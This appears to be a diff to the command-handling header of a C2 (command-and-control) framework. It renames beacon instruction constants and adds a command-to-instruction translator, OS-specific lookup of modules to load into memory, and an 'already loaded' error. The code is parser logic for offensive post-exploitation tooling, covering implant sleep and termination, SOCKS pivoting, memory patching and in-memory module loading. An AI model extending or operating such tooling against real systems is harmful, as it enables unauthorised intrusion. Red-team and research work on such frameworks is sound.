@@ -14,6 +14,7 @@
 #define ERROR_LOAD_LIBRARY 10004
 #define ERROR_GET_PROC_ADDRESS 10005
 #define ERROR_MODULE_NOT_FOUND 10006
+#define ERROR_MODULE_ALREADY_LOADED 10007
 
 
 // TODO set an enum
@@ -46,28 +47,29 @@ const std::string CmdStatusFail = "Fail";
 
 #ifdef BUILD_TEAMSERVER
 
-const std::string SleepInstructionString = "sleep";
-const std::string EndInstructionString = "end";
-const std::string ListenerInstructionString = "listener";
-const std::string LoadModuleInstructionString = "loadModule";
-const std::string UnloadModuleInstructionString = "unloadModule";
-const std::string SocksInstructionString = "socks";
-const std::string GetInfoInstructionString = "getInfo";
-const std::string PatchMemoryInstructionString = "patchMemory";
+// real instructions strings not present in the beacon
+const std::string SleepInstruction = "sleep";
+const std::string EndInstruction = "end";
+const std::string ListenerInstruction = "listener";
+const std::string LoadModuleInstruction = "loadModule";
+const std::string UnloadModuleInstruction = "unloadModule";
+const std::string SocksInstruction = "socks";
+const std::string GetInfoInstruction = "getInfo";
+const std::string PatchMemoryInstruction = "patchMemory";
 
 class CommonCommands
 {
 	public:
 	CommonCommands()
 	{
-		m_commonCommands.push_back(SleepInstructionString);
-		m_commonCommands.push_back(EndInstructionString);
-		m_commonCommands.push_back(ListenerInstructionString);
-		m_commonCommands.push_back(LoadModuleInstructionString);
-		m_commonCommands.push_back(UnloadModuleInstructionString);
-		m_commonCommands.push_back(SocksInstructionString);
-		m_commonCommands.push_back(GetInfoInstructionString);
-		m_commonCommands.push_back(PatchMemoryInstructionString);
+		m_commonCommands.push_back(SleepInstruction);
+		m_commonCommands.push_back(EndInstruction);
+		m_commonCommands.push_back(ListenerInstruction);
+		m_commonCommands.push_back(LoadModuleInstruction);
+		m_commonCommands.push_back(UnloadModuleInstruction);
+		m_commonCommands.push_back(SocksInstruction);
+		m_commonCommands.push_back(GetInfoInstruction);
+		m_commonCommands.push_back(PatchMemoryInstruction);
 	}
 
 	int getNumberOfCommand()
@@ -83,9 +85,32 @@ class CommonCommands
 			return "";
 	}
 
+	std::string translateCmdToInstruction(const std::string& cmd)
+	{
+		std::string output;
+
+		if(cmd==SleepCmd)
+			return SleepInstruction;
+		else if(cmd==EndCmd)
+			return EndInstruction;		
+		else if(cmd==ListenerCmd)
+			return ListenerInstruction;
+		else if(cmd==LoadC2ModuleCmd)
+			return LoadModuleInstruction;
+		else if(cmd==UnloadC2ModuleCmd)
+			return UnloadModuleInstruction;
+		else if(cmd==Socks5Cmd)
+			return SocksInstruction;
+		else if(cmd==GetInfoCmd)
+			return GetInfoInstruction;
+		else if(cmd==PatchMemoryCmd)
+			return PatchMemoryInstruction;
+
+		return "";
+	}
+
 	std::string getHelp(std::string cmd)
 	{
-		// OPSEC remove getHelp and getInfo strings from the beacon compilation
 		std::string output;
 
 		if(cmd==SleepCmd)
@@ -152,14 +177,14 @@ class CommonCommands
 
 	// if an error ocurre:
 	// set_returnvalue(errorMsg) && return -1
-	int init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
+	int init(std::vector<std::string> &splitedCmd, C2Message &c2Message, bool isWindows=true)
 	{
 		std::string instruction = splitedCmd[0];
 
 		//
 		// Sleep
 		//
-		if(instruction==SleepInstructionString)
+		if(instruction==SleepInstruction)
 		{
 			if(splitedCmd.size()==2)
 			{
@@ -186,7 +211,7 @@ class CommonCommands
 		//
 		// End
 		//
-		else if(instruction==EndInstructionString)
+		else if(instruction==EndInstruction)
 		{
 			c2Message.set_instruction(EndCmd);
 			c2Message.set_cmd("");	
@@ -194,7 +219,7 @@ class CommonCommands
 		//
 		// Listener
 		//
-		else if(instruction==ListenerInstructionString)
+		else if(instruction==ListenerInstruction)
 		{
 			if(splitedCmd.size()>=3)
 			{
@@ -271,21 +296,24 @@ class CommonCommands
 		//
 		// Load Memory Module
 		//
-		else if(instruction==LoadModuleInstructionString)
+		else if(instruction==LoadModuleInstruction)
 		{
 			if (splitedCmd.size() == 2)
 			{
 				std::string inputFile = splitedCmd[1];
-				
+
+				// check if it's a Path
 				std::ifstream input;
 				input.open(inputFile, std::ios::binary);
-				if(!input)
+
+				// if not check if it's a filename present in the linux or windows directory
+				if(!input && !isWindows)
 				{
 					std::string newInputFile = m_linuxModulesDirectoryPath;
 					newInputFile+=inputFile;
 					input.open(newInputFile, std::ios::binary);
 				}
-				if(!input)
+				else if(!input && isWindows)
 				{
 					std::string newInputFile = m_windowsModulesDirectoryPath;
 					newInputFile+=inputFile;
@@ -313,7 +341,7 @@ class CommonCommands
 				return -1;
 			}
 		}
-		else if(instruction==UnloadModuleInstructionString)
+		else if(instruction==UnloadModuleInstruction)
 		{
 			if (splitedCmd.size() == 2)
 			{
@@ -332,7 +360,7 @@ class CommonCommands
 		//
 		// Socks5
 		//
-		else if(instruction==SocksInstructionString)
+		else if(instruction==SocksInstruction)
 		{
 			if(splitedCmd.size()>=2)
 			{
@@ -405,6 +433,8 @@ class CommonCommands
 				errorMsg = "Error: MemoryGetProcAddress";
 			else if(errorCode==ERROR_MODULE_NOT_FOUND)
 				errorMsg = "Error: Module not found";
+			else if(errorCode==ERROR_MODULE_ALREADY_LOADED)
+				errorMsg = "Error: Module already loaded";
 		}
 		return 0;
 	}
